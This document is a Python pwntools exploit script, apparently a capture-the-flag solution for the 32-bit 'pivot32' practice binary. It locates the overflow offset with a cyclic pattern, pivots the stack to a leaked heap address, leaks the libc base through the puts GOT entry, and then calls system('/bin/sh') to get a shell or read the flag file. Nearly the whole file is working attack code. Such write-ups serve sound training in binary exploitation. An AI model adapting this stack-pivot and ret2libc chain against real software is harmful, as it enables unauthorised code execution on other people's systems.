from pwn import *

# use the following command to have the binary listen on localhost:1234
# socat TCP4-LISTEN:1234,reuseaddr,fork EXEC:./pivot32

LOCATION = "./pivot32"                      # position of the binary 
LIBC_LOC = "/lib/i386-linux-gnu/libc.so.6"  # position of libc
binary   = ELF(LOCATION)      # create object with data from the binary
libc     = ELF(LIBC_LOC)      # create object with data from the libc
ropbin   = ROP(binary)        # create object to help build ropchain to leak libc base address
roplib   = ROP(libc)          # create object to help build ropchain to spawn shell
r = remote("localhost", 1234) # establish connection with the binary
GETSHELL = 0                  # set this to 1 to get a shell instead of just the flag


def overflow():                                         # function used to find return address offset
    log.info("Finding saved return address offset...")                   
    proc = process(LOCATION, timeout=2)                 # start local process 
    proc.recvuntil('> ')                                
    proc.sendline("LMAO")                               # junk data, vulnerable input is the next one
    proc.recvuntil('> ')
    proc.sendline(cyclic(1024))                         # send cyclic pattern 
    core = Core("core")                                 # create object from data of the core dump
    offset = cyclic_find(core.pc)                       # calculate offset from cyclic pattern
    log.success("Saved return address at offset {0}".format(offset))
    return 'A' * offset                                 # return as much A's as needed


def findPivotAddr():                        # function used to extract pivot address
    r.recvuntil("pivot: ")
    pivotAddress = int(r.recv(10), base=16) # take printed pivot address and format it properly
    r.recvuntil('> ')
    log.success("Leaked pivot address at {0}".format(hex(pivotAddress)))
    return pivotAddress


def makeRopToPivot():
    popEax      = ropbin.find_gadget(["pop eax", "ret"])[0] # pop eax gadget
    xchgEaxEsp = 0x080488c2 # xchg eax, esp -> will pivot esp to address in eax, dunno why pwntools doesn't find it
    log.info("Found 'pop eax' and 'xchg eax, esp' at {0} and {1}".format(hex(popEax), hex(xchgEaxEsp)))
    ropPivot  = ""
    ropPivot += p32(popEax)
    ropPivot += p32(findPivotAddr()) # pivot address leaked by binary
    ropPivot += p32(xchgEaxEsp)
    return ropPivot


def makeRopToLeak():                # function used to generate ropchain to leak libc base address
    ropbin.puts(binary.got["puts"]) # call puts with puts' GOT entry as argument
    ropbin.main()                   # call main in order to keep the binary from crashing
    return str(ropbin)              # return ropchain


def makeRopToHack():                                    # function used to craft ropchain for the exploit
    roplib.system(libc.search("/bin/sh\x00").next())    # append system("/bin/sh") to ropchain
    return str(roplib)


def exploit():
    ################## PHASE 1 - pivot into heap and find libc base address ####################
    padding = overflow()
    ropPivot = makeRopToPivot()  # generate ropchain to pivot esp into heap
    r.sendline(makeRopToLeak())  # send ropchain to leak libc base address as position to jump to
    r.recvuntil("> ")
    
    exp  = ""
    exp += padding
    exp += ropPivot              # append ropchain
    r.sendline(exp)                 
    
    libc.address = u32(r.recv(4)) - libc.symbols["puts"] # update libc base address
    log.success("Base address of libc at {0}".format(hex(libc.address)))
    
    ################## PHASE 2 - pwn the process and get command execution #####################
    r.recvuntil("> ")
    r.sendline("LMAO") # junk data, not needed
    r.recvuntil("> ")
    
    exp  = ""
    exp += padding
    exp += makeRopToHack() # generate ropchain to spawn shell
    r.sendline(exp)
    
    if GETSHELL:
        r.interactive() # uncomment this line to get full shell
    else:
        r.sendline("cat flag.txt && exit") 
        log.success("Flag: " + r.recvall())  # profit

exploit() # start everything
